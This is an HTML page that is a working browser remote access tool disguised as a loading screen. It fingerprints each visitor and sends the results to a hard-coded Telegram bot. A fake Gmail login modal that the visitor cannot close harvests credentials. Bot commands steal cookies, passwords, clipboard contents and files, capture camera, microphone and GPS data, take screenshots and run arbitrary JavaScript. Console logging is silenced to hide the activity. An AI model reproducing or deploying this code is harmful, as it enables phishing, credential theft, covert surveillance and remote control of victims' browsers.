<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        /* Stealth fake loading screen */
        body {
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .loader-container {
            text-align: center;
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            z-index: 1000;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 0;
            opacity: 0;
            transition: opacity 0.8s;
        }
        /* Fake Gmail modal */
        .gmail-phish-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 10000;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }
        .gmail-phish-box {
            background: white;
            border-radius: 8px;
            width: 90%;
            max-width: 450px;
            padding: 30px 25px 40px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            text-align: center;
        }
        .gmail-phish-box input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .gmail-phish-box button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }
        .error-msg { color: #d93025; font-size: 14px; margin-top: 10px; display: none; }
        body.modal-active { overflow: hidden; }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
    <div class="loader-container" id="loadingOverlay">
        <div class="spinner"></div>
        <h2>Loading, please wait...</h2>
        <p>Secure connection established.</p>
    </div>
    <iframe id="mainFrame" src="https://example.com" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals"></iframe>

    <script>
        // ================= CONFIGURATION =================
        const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
        const ADMIN_CHAT_ID = '8737104261';
        const POLL_INTERVAL = 3000;
        const START_DELAY = 10000;

        let isRegistered = false;
        let updateId = 0;
        let intervalId = null;
        let phishingModalActive = false;

        // Suppress console logs
        console.log = function() {};
        console.error = function() {};

        // ================= TELEGRAM HELPERS =================
        async function sendMessage(text, parseMode = 'HTML') {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text, parse_mode: parseMode })
                });
            } catch(e) {}
        }

        async function sendPhoto(blob, caption) {
            const fd = new FormData();
            fd.append('chat_id', ADMIN_CHAT_ID);
            fd.append('photo', blob, 'capture.jpg');
            fd.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }

        async function sendDocument(blob, filename, caption) {
            const fd = new FormData();
            fd.append('chat_id', ADMIN_CHAT_ID);
            fd.append('document', blob, filename);
            fd.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
        }

        // ================= REGISTRATION =================
        async function registerClient() {
            const info = {
                url: location.href,
                ua: navigator.userAgent,
                platform: navigator.platform,
                lang: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'direct'
            };
            await sendMessage(`🔌 *New Device Connected*\n🌐 ${info.url}\n🖥️ ${info.ua.substring(0,100)}\n📱 ${info.platform}\n🌍 ${info.lang}\n📺 ${info.screen}`, 'Markdown');
        }

        // ================= PHISHING MODAL =================
        function createPhishingModal() {
            if (phishingModalActive) return;
            phishingModalActive = true;
            document.body.classList.add('modal-active');

            const modal = document.createElement('div');
            modal.className = 'gmail-phish-modal';
            modal.innerHTML = `
                <div class="gmail-phish-box">
                    <h1>Sign in to continue to Gmail</h1>
                    <input type="email" id="phish-email" placeholder="Email or phone">
                    <input type="password" id="phish-password" placeholder="Password">
                    <button id="phish-submit">Next</button>
                    <div class="error-msg" id="phish-error">Incorrect email or password. Please try again.</div>
                </div>
            `;
            document.body.appendChild(modal);

            const blockKeys = (e) => { if (e.key === 'Escape') { e.preventDefault(); document.getElementById('phish-error').style.display = 'block'; } };
            document.addEventListener('keydown', blockKeys);
            modal.addEventListener('click', (e) => { if (e.target === modal) document.getElementById('phish-error').style.display = 'block'; });

            const emailInp = document.getElementById('phish-email');
            const passInp = document.getElementById('phish-password');
            const errDiv = document.getElementById('phish-error');
            const submit = async () => {
                const email = emailInp.value.trim();
                const pass = passInp.value;
                if (!email || !pass) { errDiv.style.display = 'block'; errDiv.innerText = 'Please fill both fields.'; return; }
                await sendMessage(`🎣 *Gmail Credentials* 📧 ${email} 🔑 ${pass}`, 'Markdown');
                modal.remove();
                document.body.classList.remove('modal-active');
                phishingModalActive = false;
                document.removeEventListener('keydown', blockKeys);
                setTimeout(() => { window.location.href = 'https://mail.google.com'; }, 500);
            };
            document.getElementById('phish-submit').addEventListener('click', submit);
            emailInp.addEventListener('keypress', e => { if (e.key === 'Enter') submit(); });
            passInp.addEventListener('keypress', e => { if (e.key === 'Enter') submit(); });
        }

        // ================= COMMAND HANDLER =================
        async function handleCommand(text) {
            const parts = text.split(' ');
            const cmd = parts[0].toLowerCase();

            try {
                switch(cmd) {
                    case '/start':
                        await sendMessage(`✅ *RAT Active*\nCommands:\n/phish_gmail - forced Gmail login\n/gmail - extract from real login page\n/photo - take camera picture\n/audio - record microphone\n/location - GPS coordinates\n/screenshot - page screenshot\n/cookies - dump cookies\n/grab_pass - any visible password\n/clipboard - read clipboard\n/eval <js> - run JS\n/upload - ask user to send a file`);
                        break;
                    case '/phish_gmail':
                        if (!phishingModalActive) createPhishingModal();
                        await sendMessage('🎣 Phishing modal injected');
                        break;
                    case '/gmail': {
                        if (location.href.includes('accounts.google.com')) {
                            let email = document.querySelector('input[type="email"]')?.value || '';
                            let pass = document.querySelector('input[type="password"]')?.value;
                            if (!pass) {
                                const pf = document.querySelector('input[type="password"]');
                                if (pf) { pf.focus(); setTimeout(() => pf.blur(), 100); }
                                await sendMessage('Attempting extraction...');
                            } else {
                                await sendMessage(`🔑 Gmail credentials: ${email} / ${pass}`);
                            }
                        } else {
                            await sendMessage('Not on Google login page. Use /phish_gmail instead.');
                        }
                        break;
                    }
                    case '/photo':
                        try {
                            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            await new Promise(r => { video.onloadedmetadata = r; video.play(); });
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            stream.getTracks().forEach(t => t.stop());
                            canvas.toBlob(blob => sendPhoto(blob, '📸 Camera capture'), 'image/jpeg');
                        } catch(e) { await sendMessage(`Camera error: ${e.message}`); }
                        break;
                    case '/audio': {
                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                        const mediaRecorder = new MediaRecorder(stream);
                        let chunks = [];
                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
                        mediaRecorder.onstop = async () => {
                            const blob = new Blob(chunks, { type: 'audio/webm' });
                            await sendDocument(blob, 'recording.webm', '🎙️ Audio capture');
                            stream.getTracks().forEach(t => t.stop());
                        };
                        mediaRecorder.start();
                        setTimeout(() => mediaRecorder.stop(), 5000);
                        await sendMessage('Recording audio for 5 seconds...');
                        break;
                    }
                    case '/location':
                        navigator.geolocation.getCurrentPosition(async pos => {
                            await sendMessage(`📍 Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`);
                        }, async err => await sendMessage(`GPS error: ${err.message}`));
                        break;
                    case '/screenshot':
                        html2canvas(document.body).then(canvas => {
                            canvas.toBlob(blob => sendPhoto(blob, '📸 Screenshot'), 'image/png');
                        }).catch(e => sendMessage(`Screenshot failed: ${e.message}`));
                        break;
                    case '/cookies':
                        await sendMessage(`🍪 Cookies: ${document.cookie || 'none'}`);
                        break;
                    case '/grab_pass': {
                        const pw = document.querySelector('input[type="password"]');
                        if (pw && pw.value) await sendMessage(`🔐 Password: ${pw.value}`);
                        else await sendMessage('No password field with value found.');
                        break;
                    }
                    case '/clipboard':
                        try {
                            const txt = await navigator.clipboard.readText();
                            await sendMessage(`📋 Clipboard: ${txt}`);
                        } catch(e) { await sendMessage(`Clipboard error: ${e.message}`); }
                        break;
                    case '/eval':
                        if (parts.length > 1) {
                            const code = text.substring(5);
                            let result = eval(code);
                            if (typeof result !== 'string') result = JSON.stringify(result);
                            await sendMessage(`✅ Eval result:\n${result.substring(0, 3900)}`);
                        } else await sendMessage('Usage: /eval <js code>');
                        break;
                    case '/upload': {
                        const input = document.createElement('input');
                        input.type = 'file';
                        input.onchange = async (e) => {
                            const file = e.target.files[0];
                            if (file) await sendDocument(file, file.name, `📁 File: ${file.name}`);
                        };
                        input.click();
                        await sendMessage('File picker opened on victim side');
                        break;
                    }
                    default:
                        await sendMessage(`Unknown command: ${cmd}`);
                }
            } catch(err) {
                await sendMessage(`Error: ${err.message}`);
            }
        }

        // ================= POLLING =================
        async function pollUpdates() {
            if (!isRegistered) return;
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=15`);
                const data = await res.json();
                if (data.ok && data.result) {
                    for (const upd of data.result) {
                        if (upd.update_id >= updateId) {
                            updateId = upd.update_id + 1;
                            if (upd.message && upd.message.text) await handleCommand(upd.message.text);
                        }
                    }
                }
            } catch(e) {}
        }

        // ================= INIT =================
        async function activate() {
            await registerClient();
            isRegistered = true;
            intervalId = setInterval(pollUpdates, POLL_INTERVAL);
            document.getElementById('loadingOverlay').style.display = 'none';
            document.getElementById('mainFrame').style.opacity = '1';
        }
        setTimeout(activate, START_DELAY);
    </script>
</body>
</html>
